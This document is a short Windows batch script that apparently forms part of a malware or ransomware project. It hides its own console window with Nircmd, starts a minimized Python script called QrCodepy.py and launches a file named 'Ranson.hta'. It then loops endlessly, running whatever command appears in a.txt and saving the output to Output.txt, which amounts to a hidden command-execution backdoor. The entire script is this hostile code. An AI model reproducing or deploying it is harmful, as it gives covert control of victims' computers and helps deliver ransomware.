set "scriptPath=%~dp0"
Cd /d %scriptPath%
del a.txt
Nircmd win hide process "cmd.exe"
start /min QrCodepy.py
Timeout /t 5
Start Ranson.hta
:a
TImeout /t 1
if exist a.txt (goto :exist) else (goto :a)
:exist 
@echo off
setlocal enabledelayedexpansion
for /f "delims=" %%i in (a.txt) do set "coucou=%%i"
call !coucou! >Output.txt
endlocal
del /q a.txt
goto :a